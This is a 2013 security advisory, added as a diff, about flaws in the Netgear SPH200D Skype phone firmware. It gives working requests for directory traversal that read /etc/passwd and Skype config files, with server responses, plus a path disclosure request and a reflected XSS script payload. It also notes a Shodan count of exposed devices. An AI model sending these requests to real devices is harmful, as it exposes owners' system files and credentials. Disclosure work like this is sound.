@@ -1,0 +1,111 @@
+Device Name: SPH200D
+Vendor: Netgear
+
+============ Vulnerable Firmware Releases: ============
+
+Firmware Version : 1.0.4.80
+Kernel Version : 4.1-18
+Web Server Version : 1.5
+
+============ Device Description: ============
+
+http://support.netgear.com/product/SPH200D
+
+============ Shodan Torks ============
+
+Shodan Search: SPH200D
+=> Results 337 devices
+
+============ Vulnerability Overview: ============
+
+* directory traversal: 
+
+Access local files of the device. You need to be authenticated or you have to find other methods for accessing the device.
+
+Request:
+http://192.168.178.103/../../etc/passwd
+
+Response:
+HTTP/1.0 200 OK
+Content-type: text/plain
+Expires: Sat, 24 May 1980.7:00:00.GMT
+Pragma: no-cache
+Server: simple httpd 1.0
+
+root:x:0:0:root:/root:/bin/bash
+demo:x:5000:100:Demo User:/home/demo:/bin/bash
+nobody:x:65534:65534:Nobody:/htdocs:/bin/bash
+
+
+
+If you request a directory you will get a very nice directory listing for browsing through the filesystem:
+/../../var/
+
+HTTP/1.0 200 OK
+Content-type: text/html
+Expires: Sat, 24 May 1980.7:00:00.GMT
+Pragma: no-cache
+Server: simple httpd 1.0
+
+<H1>Index of ../../var/</H1>
+
+<p><a href="/../../var/.">.</a></p>
+<p><a href="/../../var/..">..</a></p>
+<p><a href="/../../var/.Skype">.Skype</a></p>
+<p><a href="/../../var/jffs2">jffs2</a></p>
+<p><a href="/../../var/htdocs">htdocs</a></p>
+<p><a href="/../../var/cnxt">cnxt</a></p>
+<p><a href="/../../var/ppp">ppp</a></p>
+<p><a href="/../../var/conf">conf</a></p>
+<p><a href="/../../var/bin">bin</a></p>
+<p><a href="/../../var/usr">usr</a></p>
+<p><a href="/../../var/tmp">tmp</a></p>
+
+So with this information you are able to access the skype configuration with the following request:
+/../../var/.Skype/<user>/config.xml
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/LFI-01.preview.png
+
+* For changing the current password there is no request to the current password 
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+* local path disclosure: 
+
+Request:
+http://192.168.178.103/%3C/
+
+Response:
+The requested URL '/var/htdocs/%3C/' was not found on this server.
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/local-path-disclosure.png
+
+
+* reflected Cross Site Scripting 
+
+Appending scripts to the URL reveals that this is not properly validated for malicious input.
+http://192.168.178.102/network-dhcp.html4f951<script>alert(1)</script>e51c012502f
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/XSSed-IE6.png
+
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-002
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+August 2012 - discovered vulnerability
+07.08.2012 - reported vulnerability to Netgear
+08.08.2012 - case closed by Netgear
+29.01.2013 - public release
+
+===================== Advisory end =====================
